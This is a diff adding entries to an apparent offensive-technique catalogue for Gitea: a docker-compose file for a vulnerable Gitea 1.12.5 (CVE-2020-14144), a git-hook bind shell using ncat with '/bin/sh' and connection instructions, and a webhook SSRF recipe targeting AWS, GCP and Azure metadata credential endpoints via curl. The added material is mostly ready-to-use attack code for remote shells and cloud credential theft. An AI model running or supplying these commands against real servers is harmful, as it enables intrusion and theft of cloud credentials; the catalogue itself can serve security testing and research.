@@ -9,7 +9,34 @@ comment: "Gitea is a self-hosted Git service. Administrators and users with the 
   that re-enable hooks remain fully exploitable by any user with hook privileges.\n\
   \nGit hook execution is inherent to Git server functionality, not a vulnerability\n\
   per se \u2014 the vendor considers it expected behavior for privileged users.\n"
+docker:
+  compose: "services:\n  gitea:\n    image: gitea/gitea:1.12.5\n    ports:\n     \
+    \ - \"3000:3000\"\n      - \"2222:22\"\n    environment:\n      USER_UID: \"1000\"\
+    \n      USER_GID: \"1000\"\n      GITEA__security__INSTALL_LOCK: \"false\"\n \
+    \   volumes:\n      - gitea_data:/data\nvolumes:\n  gitea_data:\n"
+  note: "Starts Gitea 1.12.5 (vulnerable to CVE-2020-14144 \u2014 git hooks enabled\
+    \ by default,\nallowing any user with hook permissions to execute OS commands\
+    \ on push).\nAccess at `http://localhost:3000`. Complete the installer on first\
+    \ visit:\ndatabase type SQLite, leave other defaults. Register an admin account\
+    \ during install.\nTo enable git hooks for a user: Site Administration \u2192\
+    \ Users \u2192 Edit \u2192 Enable \"May create Git hooks\".\n"
 functions:
+  bind-shell:
+  - code: |
+      #!/bin/bash
+      ncat -lvp 12345 -e /bin/sh &
+    comment: |
+      Set this script as the post-receive hook (Repository > Settings > Git Hooks >
+      post-receive). Trigger by pushing any commit. The trailing & prevents the git
+      client from hanging while the shell awaits a connection.
+      Connect from the attacker with: nc victim.com 12345
+      Requires ncat (nmap package) on the Gitea server.
+    connector: tcp-client
+    contexts:
+      admin:
+      authenticated:
+    platform: linux
+    tty: false
   rce:
   - code: |
       #!/bin/bash
@@ -26,6 +53,7 @@ functions:
     contexts:
       admin:
       authenticated:
+    platform: linux
   reverse-shell:
   - blind: true
     code: |
@@ -40,7 +68,44 @@ functions:
       admin:
       authenticated:
     listener: tcp-server
+    platform: linux
     tty: false
+  ssrf:
+  - code: |
+      # Step 1: create a webhook pointing to an internal URL (requires repo admin access)
+      curl -s -X POST "http://victim.com:3000/api/v1/repos/<owner>/<repo>/hooks" \
+        -H "Authorization: token <api_token>" \
+        -H "Content-Type: application/json" \
+        -d '{
+          "type": "gitea",
+          "config": {
+            "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "content_type": "json"
+          },
+          "events": ["push"],
+          "active": true
+        }'
+
+      # Step 2: push a commit to the repository to trigger the webhook
+      git commit --allow-empty -m "trigger" && git push
+    comment: |
+      Gitea webhooks make outbound HTTP POST requests to any configured URL when
+      repository events occur. Setting the URL to an internal endpoint causes the
+      Gitea server to probe internal services or cloud metadata endpoints.
+      The HTTP response status is logged in the webhook delivery history (Repository >
+      Settings > Webhooks > click the hook > Recent Deliveries), leaking whether the
+      target responded.
+
+      Target cloud metadata endpoints:
+      - AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      - GCP: http://metadata.google.internal/computeMetadata/v1/
+      - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+      Note: Gitea admins can restrict webhook targets via ALLOWED_HOST_LIST in app.ini.
+      This is not set by default, leaving all internal endpoints reachable.
+    contexts:
+      admin:
+      authenticated:
   webshell:
   - code: |
       #!/bin/bash
